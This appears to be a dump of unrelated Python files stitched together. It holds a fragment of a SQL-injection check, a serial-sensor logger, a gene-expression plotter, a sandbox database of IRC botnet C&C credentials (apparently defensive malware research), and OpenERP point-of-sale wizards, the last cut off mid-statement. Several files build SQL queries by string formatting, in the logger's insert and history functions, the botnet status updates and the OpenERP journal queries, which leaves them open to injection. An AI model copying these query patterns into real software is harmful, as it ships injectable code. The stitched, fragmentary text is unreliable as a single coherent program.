if "You have an error in your SQL syntax" in full_body:
	print ("Vulnerable to SQL injection !!")
else:
	print ("Not vulnerable to SQL injection.")

# -*- coding: utf-8 -*-
"""
Created on Mon Jan  1 21:38:13 2018

@author: Adam
"""
import time
from random import random, gauss
from .base import Device


class Fake(Device):
    """ simulate comms. with a serial device"""
    def __init__(self, settings, debug=False):
        self.settings = settings
        self.sensors = settings["sensors"]

    def read_data(self, sensors=None):
        """ return fake sensor data """
        if sensors is None:
            sensors = self.sensors
        for i, _ in enumerate(sensors):
            try:
                if random() < 0.01:
                    raise Exception("Fake error")
                value = gauss(293 + 0.5*i, 0.1)
                yield f"{value:.4f}"
            except:
                yield "NULL"                    

    def close(self):
        pass

# -*- coding: utf-8 -*-
"""
Created on Mon Jan  1 21:38:13 2018

@author: Adam
"""
import codecs
import re
import time
import warnings
from serial import SerialException, Serial
from .tools import get_serial_settings
from .base import Device


class Generic(Serial, Device):
    """ communication with a serial device """
    def __init__(self, settings, debug=False):
        self.settings = settings
        self.serial_settings = get_serial_settings(settings)
        self.sensors = settings.get("sensors", None)
        self.cmd = codecs.decode(self.settings["cmd"], "unicode-escape")
        self.regex = settings.get("regex", None)
        # initialise Serial class
        self.debug = debug
        if self.debug:
            print("serial settings:", self.serial_settings)
        super().__init__(**self.serial_settings)

    def read_data(self, sensors=None, reset_wait=60):
        """ read sensor data """
        # check connection and flush buffer
        if sensors is None:
            sensors = self.sensors
        if self.debug:
            print("sensors:", sensors)
        # reset connection if not open
        while not self.is_open:
            try:
                self.open()
            except SerialException:
                time.sleep(reset_wait)
        # query instrument
        self.flush()
        for sen in sensors:
            try:
                self.flushInput()
                # parse command
                serial_cmd = self.cmd.replace("{sensor}", sen)
                serial_cmd = bytes(serial_cmd, "utf8")
                if self.debug:
                    print("serial cmd:", serial_cmd)
                # write command, read response
                self.write(serial_cmd)
                # wait for acknowledgement / send enquiry
                if "ack" in self.settings and "enq" in self.settings:
                    # needed for maxigauge
                    ack = codecs.decode(self.settings["ack"], "unicode-escape")
                    response = self.readline()
                    if self.debug:
                        print("acknowledgement:", response, bytes(ack, "utf8"))
                    if response == bytes(ack, "utf8"):
                        # send enquiry
                        enq = codecs.decode(self.settings["enq"], "unicode-escape")
                        self.write(bytes(enq, "utf8"))
                    else:
                        raise SerialException("Acknowledgement failed")
                response = self.readline()
                if self.debug:
                    print(response)
                # format response
                response = response.strip().decode("utf-8")
                if self.regex is not None:
                    match = re.search(self.regex, response)
                    response = match.group(1)
                yield response
            except:
                yield "NULL"                    

# -*- coding: utf-8 -*-
"""
Created on Sat Dec 23 13:43:09 2017

@author: Adam
"""
import sys
import os
import time
import warnings
import getpass
import sqlite3
from importlib import import_module
import pymysql
from cryptography.fernet import Fernet
from .core import (TABLE,
                   DATA_DIRE,
                   KEY_FILE)
from .tools import (db_check,
                    db_insert,
                    parse_settings)


def get_columns(settings):
    """ get columns from sensor names """
    sensors = settings["sensors"]
    if "column_fmt" in settings:
        column_fmt = settings["column_fmt"]
        columns = ("TIMESTAMP",) \
                  + tuple([column_fmt.replace("{sensor}", str(sen).strip()) for sen in sensors])
    else:
        columns = ("TIMESTAMP",) \
                  + tuple([str(sen).strip() for sen in sensors])
    return columns

def get_device(settings, instrum, debug=False):
    """ get instance of device_class """
    if "device_class" in settings:
        device_class = settings["device_class"]
    else:
        if instrum in ["simulate", "fake"]:
            device_class = "fake.Fake"
        else:
            device_class = "generic.Generic"
    # serial connection
    mod, obj = device_class.split(".")
    module = import_module("..devices." + mod, __name__)
    return getattr(module, obj)(settings, debug=debug)

def get_sqlite(settings, columns):
    """ get sqlite connection """
    assert "db" in settings, "`db` not set in config"
    name = settings["db"]
    fname, _ = os.path.splitext(name)
    fname += ".db"
    fil = os.path.join(DATA_DIRE, fname)
    if not os.path.isfile(fil):
        raise OSError(f"{fname} does not exists.  Use generate or create.")
    db = sqlite3.connect(fil)
    db_check(db, TABLE, columns)
    return db

def get_sql(settings):
    """ get connection to sql database """
    assert "sql_host" in settings, "sql_host not set in config"
    assert "sql_port" in settings, "sql_port not set in config"
    assert "sql_db" in settings, "sql_db not set in config"
    assert "sql_table" in settings, "sql_table not set in config"
    if "sql_user" not in settings:
        settings["sql_user"] = input("SQL username: ")
    else:
        print(f"SQL username: {settings['sql_user']}")
    if "sql_passwd" not in settings:
        prompt = f"Enter password: "
        sql_passwd = getpass.getpass(prompt=prompt, stream=sys.stderr)
    else:
        # decrypt password
        assert os.path.isfile(KEY_FILE), f"{KEY_FILE} not found.  Create using passwd."
        with open(KEY_FILE, "rb") as fil:
            key = fil.readline()
        fern = Fernet(key)
        sql_passwd = fern.decrypt(bytes(settings["sql_passwd"], "utf8")).decode("utf8")
    # connect
    sql_conn = pymysql.connect(host=settings["sql_host"],
                               port=int(settings["sql_port"]),
                               user=settings["sql_user"],
                               password=sql_passwd,
                               database=settings["sql_db"])
    return sql_conn

def run(config, instrum, wait,
        output=False, sql=False, header=True, quiet=False, debug=False):
    """ start the emonitor server and output to sqlite database.
    """
    tty = sys.stdout.isatty()
    settings = parse_settings(config, instrum)
    columns = get_columns(settings)
    if debug and tty:
        print("DEBUG enabled")
    try:
        device = get_device(settings, instrum, debug=debug)
        # sqlite output
        db = None
        if output:
            db = get_sqlite(settings, columns)
        # sql output
        sql_conn = None
        if sql:
            sql_conn = get_sql(settings)
        # header
        if tty:
            if not quiet:
                print("Starting emonitor. Use Ctrl-C to stop. \n")
                if header:
                    test = tuple(device.read_data())
                    if debug:
                        print(test)
                    str_width = len(str(test[0]))
                    print(columns[0].rjust(19) + " \t",
                          "\t ".join([col.rjust(str_width) for col in columns[1:]]))
        elif header:
            print(",".join(columns))
        # start server
        while True:
            ## read data
            values = tuple(device.read_data())
            is_null = all([isinstance(v, str) and v.upper() == "NULL" for v in values])                    
            ## output
            if not is_null:
                values = (time.strftime("%Y-%m-%d %H:%M:%S"), ) + values
                if tty:
                    if not quiet:
                        print("\t ".join(values))                    
                else:
                    print(",".join(values))                    
                if output:
                    db_insert(db, TABLE, columns, values, debug=debug)
                if sql:
                    try:
                        if not sql_conn.open:
                            # attempt to reconnect
                            sql_conn.connect()
                        db_insert(sql_conn, settings["sql_table"], columns, values, debug=debug)                    
                    except:
                        warnings.warn("SQL connection failed")
            time.sleep(wait)
    except KeyboardInterrupt:
        if tty and not quiet:
            print("\nStopping emonitor.")
    finally:
        device.close()
        if db is not None:
            db.close()
        if sql_conn is not None:
            sql_conn.close()

# -*- coding: utf-8 -*-
"""
Created on Sun Jan 14 21:55:57 2018

@author: adam
"""
import os
import warnings
import sqlite3
import datetime
from collections.abc import Iterable
from ast import literal_eval
import numpy as np
import pandas as pd
from .core import DATA_DIRE

class CausalityError(ValueError):
    """ `There was an accident with a contraceptive and a time machine.`
    """
    pass


def db_path(name):
    """ Get path of sqlite file for 'name'.
    """
    fil = os.path.join(DATA_DIRE, name + '.db')
    return fil


def db_init(conn, table, columns, debug=False):
    """ initialize sqlite database
    """
    column_str = ", ".join(['`' + str(c) + '` DOUBLE DEFAULT NULL' for c in columns])
    sql = f"CREATE TABLE {table}(`TIMESTAMP` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, {column_str});"
    if debug:
        print(sql)
    cursor = conn.cursor()
    cursor.execute(sql)                    
    cursor.close()


def db_check(conn, table, columns, debug=False):
    """ check sqlite database
    """
    sql = f"SELECT * FROM {table};"
    if debug:
        print(sql)
    cursor = conn.cursor()
    cursor.execute(sql)                    
    db_columns = list(next(zip(*cursor.description)))
    for col in columns:
        if col not in db_columns:
            cursor.close()
            conn.close()
            raise NameError(f"columnn `{col}` not in sqlite database")
    cursor.close()


def db_count(conn, table, debug=False):
    """ count rows in sqlite table
    """
    sql = f"SELECT COUNT(*) as count FROM {table};"
    if debug:
        print(sql)
    cursor = conn.cursor()
    num_rows = cursor.execute(sql).fetchone()[0]                    
    cursor.close()
    return num_rows


def db_describe(conn, table, debug=False):
    """ get sqlite database structure
    """
    sql = f"PRAGMA table_info({table});"
    if debug:
        print(sql)
    cursor = conn.cursor()
    info = cursor.execute(sql).fetchall()                    
    cursor.close()
    return info


def db_insert(conn, table, columns, values, debug=False):
    """ INSERT INTO {table} {columns} VALUES {values};
    """
    col_str = str(columns).replace("'", "`")                    
    sql = f"INSERT INTO {table} {col_str} VALUES {values};"                    
    if debug:
        print(sql)
    cursor = conn.cursor()
    cursor.execute(sql)                    
    conn.commit()


def history(conn, start, end, **kwargs):
    """ SELECT * FROM table WHERE tcol BETWEEN start AND end.

        If start and end are more than 24 hours apart, then a random
        sample of length specified by 'limit' is returned, unless
        'full_resolution' is set to True.

        args:
            conn          database connection           object
            start         query start time              datetime.datetime / tuple / dict
            end           query end time                datetime.datetime / tuple / dict

        kwargs:
            table='data'             name of table in database        str
            limit=6000               max number of rows               int
            tcol='TIMESTAMP'         timestamp column name            str
            full_resolution=False    No limit - return everything     bool
            coerce_float=False       convert, e.g., decimal to float  bool
            dropna=True              drop NULL columns                bool
            debug=False              print SQL query                  bool
        return:
            result       pandas.DataFrame
    """
    # read kwargs
    table = kwargs.get('table', 'data')
    limit = kwargs.get('limit', 6000)
    tcol = kwargs.get('tcol', 'TIMESTAMP')
    full_resolution = kwargs.get('full_resolution', False)
    coerce_float = kwargs.get('coerce_float', False)
    dropna = kwargs.get('dropna', True)
    debug = kwargs.get('debug', False)
    # start
    if isinstance(start, datetime.datetime):
        pass
    elif isinstance(start, tuple):
        start = datetime.datetime(*start)
    elif isinstance(start, dict):
        start = datetime.datetime(**start)
    else:
        raise TypeError("type(start) must be in [datetime.dateime, tuple, dict].")
    # end
    if isinstance(end, datetime.datetime):
        pass
    elif isinstance(end, tuple):
        end = datetime.datetime(*end)
    elif isinstance(start, dict):
        end = datetime.datetime(**end)
    else:
        raise TypeError("type(end) must be in [datetime.dateime, tuple, dict].")
    # check times
    if end < start:
        raise CausalityError('end before start')
    # connection type
    if isinstance(conn, sqlite3.Connection):
        rand = "RANDOM()"
    else:
        rand = "RAND()"
    # SQL query
    if full_resolution or limit is None:
        reorder = False
        sql = f"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}';"
    # check start and end are on the same day
    elif end - datetime.timedelta(days=1) < start:
        reorder = False
        sql = f"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}' LIMIT {limit};"
    else:
        # if time span is more than 1 day randomly sample measurements from range
        reorder = True
        sql = f"SELECT * FROM `{table}` WHERE `{tcol}` BETWEEN '{start}' AND '{end}' ORDER BY {rand} LIMIT {limit};"
    if debug:
        print(sql)
    result = pd.read_sql_query(sql, conn, coerce_float=coerce_float, parse_dates=[tcol])
    if len(result.index) > 0:
        result.replace("NULL", np.nan, inplace=True)
        if dropna:
            # remove empty columns
            result = result.dropna(axis=1, how='all')
        if reorder:
            # sort data by timestamp
            result = result.sort_values(by=tcol)
        result = result.set_index(tcol)
    return result


def live(conn, delta=None, **kwargs):
    """ SELECT * FROM table WHERE tcol BETWEEN (time.now() - delta) AND time.now().

        If delta is more than 24 hours then a random sample of length specified
        by 'limit' is returned, unless 'full_resolution' is set to True.

        args:
            conn          database connection           object
            delta         query start time              datetime.timedelta / dict

        kwargs:
            table='data'             name of table in database        str
            limit=6000               max number of rows               int
            tcol='TIMESTAMP'         timestamp column name            str
            full_resolution=False    No limit - return everything     bool
            coerce_float=True        convert, e.g., decimal to float  bool
            dropna=True              drop NULL columns                bool
            debug=False              print SQL query                  bool
        return:
            result       pandas.DataFrame

    """
    if delta is None:
        delta = {"hours" : 4}
    if isinstance(delta, datetime.timedelta):
        pass
    elif isinstance(delta, dict):
        delta = datetime.timedelta(**delta)
    else:
        raise TypeError("type(delta) must be in [datetime.timedelta, dict].")
    end = datetime.datetime.now()
    start = end - delta
    return history(conn, start, end, **kwargs)


def tquery(conn, start=None, end=None, **kwargs):
    """ ------------------------------------------------------------
        DeprecationWarning
            Use history() or live() instead.
        ------------------------------------------------------------

        SELECT * FROM table WHERE tcol BETWEEN start AND end.

        If start is None, it will be set to time.now() - delta [default:
        4 hours], i.e., live mode.

        If end is None, set to start + delta, i.e., to select a given time
        window, specify either: start and end, or start and delta.

        If start and end are more than 24 hours apart, then a random
        sample of length specified by 'limit' is returned, unless
        'full_resolution' is set to True.

        args:
            conn          database connection           object
            start         query start time              datetime.datetime
            end           query end time                datetime.datetime

        kwargs:
            delta=datetime.timedelta(hours=4)
                                     time to look back in live mode   datetime.timedelta
            table='data'             name of table in database        str
            limit=6000               max number of rows               int
            tcol='TIMESTAMP'         timestamp column name            str
            full_resolution=False    No limit - return everything     bool
            coerce_float=True        convert, e.g., decimal to float  bool
            dropna=True              drop NULL columns                bool
            debug=False              print SQL query                  bool
        return:
            result       pandas.DataFrame
    """
    warnings.warn("tquery() is deprecated. Use history() or live() instead.", DeprecationWarning)
    # read kwargs
    delta = kwargs.get('delta', datetime.timedelta(hours=4))
    start, end = get_trange(start, end, delta)
    result = history(conn, start, end, **kwargs)
    return result


def get_trange(start, end, delta):
    """ find start and end times from inputs
    """
    if not isinstance(start, datetime.datetime) or not isinstance(end, datetime.datetime):
        # start or end unspecified -> delta required
        if not isinstance(delta, datetime.timedelta):
            # check delta type
            raise TypeError('delta must be of type datetime.timedelta')
        # check whether start or end is missing
        if not isinstance(start, datetime.datetime):
            # start not specified, check end
            if not isinstance(end, datetime.datetime):
                # neither start nor end specified -> live mode
                end = datetime.datetime.now()
            # infer start from end and delta
            start = end - delta
        if not isinstance(end, datetime.datetime):
            # infer end from start and delta
            end = start + delta
    # all good?
    if end < start:
        raise CausalityError('end before start')
    return start, end


def format_commands(settings):
    """ format string commands
    """
    for key in ['cmd', 'ack', 'enq']:
        if key in settings:
            value = settings[key]
            if isinstance(value, str):
                # string replacements
                for placeholder, replacement in [("$CR", "\x0D"),
                                                 ("$LF", "\x0A"),
                                                 ("$ACK", "\x06"),
                                                 ("$ENQ", "\x05")]:
                    if placeholder in value:
                        value = value.replace(placeholder, replacement)
                settings[key] = value
    return settings


def parse_settings(conf, instrum, ignore=None):
    """ read config section and use ast.literal_eval() to get python dtypes
    """
    settings = dict()
    # keys to ignore
    if ignore is None:
        ignore = []
    if not isinstance(ignore, Iterable):
        ignore = [ignore]
    # evaluate items
    for key, value in conf.items(instrum):
        if key in ignore:
            settings[key] = value
        else:
            try:
                settings[key] = literal_eval(value)
            except:
                settings[key] = value
    return format_commands(settings)



from loader import Loader
import openpyxl as pyxl
import os.path
import numpy as np

class Grapher():

	def __init__(self):
		self.loader = Loader()		
		# dictionary of data sets
		self.sets = self.loader.getSets()
		# create a list with all the data sets (that are not blank)
		self.all_sets = []
		for key in self.sets:
			if key != 'blank':
				self.all_sets.append(self.sets[key])

		self.graph_width_param = 4
		self.graph_sub_width_param = 0.5
		self.marker_size = 40
		self.folder_name = 'static/images'
		self.folder_static_name = 'images'

	def findFile(self,file_name):
		#return os.path.isfile(file_name)
		return False
	def expectFileName(self,gene_name,data_set,graph_type,file_type = 'png'):
		file_name = '_'.join([gene_name,data_set.split('_')[0],graph_type])
		file_name = '.'.join([file_name,file_type])
		file_dir = '/'.join([self.folder_name,file_name])
		return file_dir

	def decodeGeneName(self,expected_file):
		file_name = expected_file.split('/')[2]
		gene_name = file_name.split('_')[0]
		print gene_name
		return gene_name

	def decodeDataSet(self,expected_file):
		file_name = expected_file.split('/')[2]
		data_set = file_name.split('_')[1]
		print data_set
		return data_set


	def new_bar_plot(self,gene_name,cell_type,datasets = 'ALL'):
		data = self.loader.get_gene(gene_name=gene_name,datasets=datasets,cells=cell_type)
		if data == {}:                    
			data = -1                    
		return data

	def new_plot(self,gene_name,cells='ALL'):
		data = self.loader.get_gene(gene_name=gene_name,datasets='ALL',cells=cells)
		if data == {}:                    
			data = -1                    
		return data

	def bar_plot(self,gene_name,cell_name):
		exp_data = self.loader.loadCellSpecific(gene_name,cell_name)
		return exp_data
	"""
	create scatter plot of the expression
	level of the gene in all the cells
	types, and a different plot for each dataset
	"""
	def scatter_plot(self,gene_name):
		data_sets = self.all_sets	
		# check if the gene exist at all.
		if self.loader.findRowMatch(gene_name) == -1:
			return -1
		sets_dict = self.loader.loadGenes([gene_name],data_sets)
		some_data_dict = []
		counter = 0
		for data_set in sets_dict:
			counter +=1
		# add  counnter data sets		
			# create a scatter graph for this set.
			data = sets_dict[data_set]
			head = data['head'][5:]
			gene_data = data[gene_name][5:]
			# splice the data for male and female.

			# create the labels of x axis
			xlabels = []
			for label in head:
				current = label.split('_')[0]
				if current not in xlabels:
					xlabels.append(current)
				else:
					xlabels.append('')

			x_index = []
			for label in xlabels:
				if 0 in x_index:
					if label == '':
						x_index.append(x_index[-1]+self.graph_sub_width_param)
					else:
						x_index.append(x_index[-1]+self.graph_width_param)
				else:
					x_index.append(0)

			female_data = gene_data[::2]
			male_data = gene_data[1::2]
			x_female = []
			x_male = []

			current_indexed = []
			size=0
			# remeber to change the way it arranges data for wierd cells like T4
			# do shenanigans and rearrange some numbers for better apearance			
			for ind, label in enumerate(xlabels):
				if label != '':
					size = len(current_indexed)
					if size != 0:
						for i in current_indexed[:size/2]:
							x_female.append(i)
						for i in current_indexed[size/2:]:
							x_male.append(i)
					current_indexed = []
				current_indexed.append(x_index[ind])
			for i in current_indexed[:size/2]:
				x_female.append(i)
			for i in current_indexed[size/2:]:
				x_male.append(i)

			graph_title = ' '.join([gene_name,'expression level',str(counter)])

			x_labels = xlabels
			data_dic = {}
			data_dic['x_index'] = x_index
			data_dic['x_labels'] = x_labels
			data_dic['title'] = graph_title
			data_dic['x_female'] = x_female
			data_dic['female_data'] = female_data
			data_dic['x_male'] = x_male
			data_dic['male_data'] = male_data
			some_data_dict.append(data_dic)
		return some_data_dict

if __name__ == '__main__':
	# just a test to see if it works
	grapher = Grapher()
	grapher.scatter_plot(['FIRRE' ])
	#grapher.scatter_plot('FIRRE')

	#print grapher.loader.loadGenes(['FIRRE'],['Female_Male_exp_levels_norm.xlsx'])

import sqlite3

class SandboxBotnet(object):
    sandbox_id = None
    file_name = ''
    file_md5 = ''
    analysis_date = ''
    irc_addr = ''
    irc_server_pwd = ''
    irc_nick = ''
    irc_user = ''
    irc_mode = ''
    irc_channel = ''
    irc_nickserv = ''
    irc_topic = ''
    irc_notice = []
    irc_privmsg = []
    
class Botnet(SandboxBotnet):
    botnet_id = None
    server_status = None
    channel_status = None
    bot_status = None

class SandboxDB(object):
    
    def __init__(self):
        self.db = sqlite3.connect('db/sandbox.db')
    
    def get_credentials(self):
        botnet_list = []
        cursor = self.db.cursor()
        cursor.execute("""SELECT * FROM botnets""")
        for res in cursor.fetchall():
            botnet = SandboxBotnet()
            botnet.sandbox_id, botnet.analysis_date, botnet.file_md5, botnet.file_name = res[0:4]
            botnet.irc_addr, botnet.irc_server_pwd, botnet.irc_nick = res[4:7]
            botnet.irc_user, botnet.irc_mode, botnet.irc_channel = res[7:10]
            botnet.irc_nickserv, botnet.irc_notice, botnet.irc_privmsg = res[10:]
            botnet_list.append(botnet)
        return botnet_list
    
    def close(self):
        self.db.close()

class BotnetInfoDB():

    def __init__(self):
        self.conn = sqlite3.connect('db/botnet_info.db')
        self.create()

    def create(self):
        cursor = self.conn.cursor()
        try:
            cursor.execute("""CREATE TABLE IF NOT EXISTS botnet_info (id INTEGER PRIMARY KEY, 
            addr TEXT, server_pass TEXT, nick TEXT, user TEXT, mode TEXT, channel TEXT, sandboxid TEXT,
            lasttime TEXT, topic TEXT, server_status TEXT, channel_status TEXT, bot_status TEXT)""")
            self.conn.commit()
        except sqlite3.OperationalError, e:
            print "Creating database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Creating database Error:", e
        finally:
            cursor.close()

    def insert(self, addr, server_pass, nick, user, mode, channel, sandboxid, time):
        cursor = self.conn.cursor()
        try:
            # If C&C server and port exists, insert into db
            if addr: 
                cursor.execute("INSERT INTO botnet_info VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (None, addr, server_pass, nick, user, mode, channel, sandboxid, time, None, None, None, None))
        except sqlite3.OperationalError, e:
            print "Insert into database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Insert into database Error:", e
        finally:
            self.conn.commit()
            cursor.close()

    def select_all(self):
        cursor = self.conn.cursor()
        botnet_list = []
        try:
            data = cursor.execute("SELECT * FROM botnet_info").fetchall()
            for res in data:
                botnet = Botnet()
                botnet.botnet_id = res[0]
                botnet.irc_addr = res[1]
                botnet.irc_server_pwd = res[2]
                botnet.irc_nick = res[3]
                botnet.irc_user = res[4]
                botnet.irc_mode = res[5]
                botnet.irc_channel = res[6]
                botnet.irc_topic = res[7]
                botnet.server_status = res[8]
                botnet.channel_status = res[9]
                botnet.bot_status = res[10]
                botnet_list.append(botnet)
        except sqlite3.OperationalError, e:
            print "Select from database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Select from database Error:", e
        finally:
            cursor.close()
        return botnet_list

    def select_by_features(self, addr, channel):
        cursor = self.conn.cursor()
        data = None
        try:
            data = cursor.execute("SELECT id FROM botnet_info WHERE addr == ? AND channel == ?", (addr, channel) ).fetchone()
        except sqlite3.OperationalError, e:
            print "Select from database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Select from database Error:", e
        finally:
            cursor.close()
        return data

    def update_time(self, timestamp, botnetID):
        cursor = self.conn.cursor()
        try:
            cursor.execute("""UPDATE botnet_info SET lasttime = '%s' WHERE id == '%s'""" % (timestamp, str(botnetID)))
            self.conn.commit()
        except sqlite3.OperationalError, e:
            print "Update Time To database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Update Time To database Error:", e
        finally:
            cursor.close()

    def update_connection(self):
        pass

    def update_status(self, botnetID, target, status):
        cursor = self.conn.cursor()
        try:
            cursor.execute("""UPDATE botnet_info SET %s = '%s' WHERE id == '%s'""" % (target, status, str(botnetID)))                    
        except sqlite3.OperationalError, e:
            print "Update %s To database Error:" % status, e
        except sqlite3.ProgrammingError, e:
            print "Update %s To database Error:" % status, e
        finally:
            self.conn.commit()
            cursor.close()

    def update_topic(self, line, botnetID):
        cursor = self.conn.cursor()
        try:
            cursor.execute("""UPDATE botnet_info SET topic = ? WHERE id == ? """, (line, str(botnetID)))
        except sqlite3.OperationalError, e:
            print "Update Topic To database Error:", e
        except sqlite3.ProgrammingError, e:
            print "Update Topic To database Error:", e
        finally:
            self.conn.commit()
            cursor.close() 

    def close_handle(self):
        self.conn.close()

class MessageDB():

    def __init__(self, botnetID):
        self.conn = sqlite3.connect('db/botnets/Botnet_%s.db' % str(botnetID))
        self.create_table()

    def create_table(self):
        cursor = self.conn.cursor()
        try:
            cursor.execute("CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, timestamp TEXT, rawmsg TEXT)")
            self.conn.commit()
        except sqlite3.OperationalError, e:
            print "creating table error", e
        except sqlite3.ProgrammingError, e:
            print "creating table error", e
        finally:
            cursor.close()

    def insert(self, time, msg):
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO messages VALUES(?, ?, ?)", (None, time, msg))
            self.conn.commit()
        except sqlite3.OperationalError, e:
            print "insert table error", e
        except sqlite3.ProgrammingError, e:
            print "insert table error", e
        finally:
            cursor.close()

    def show_all(self):
        cursor = self.conn.cursor()
        data = None
        try:
            data = cursor.execute("SELECT * FROM messages").fetchall()
        except sqlite3.OperationalError, e:
            print "select data from db Error", e
        except sqlite3.ProgrammingError, e:
            print "select data from db Error", e
        finally:
            cursor.close()
        return data

    def close_handle(self):
        self.conn.close()



# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
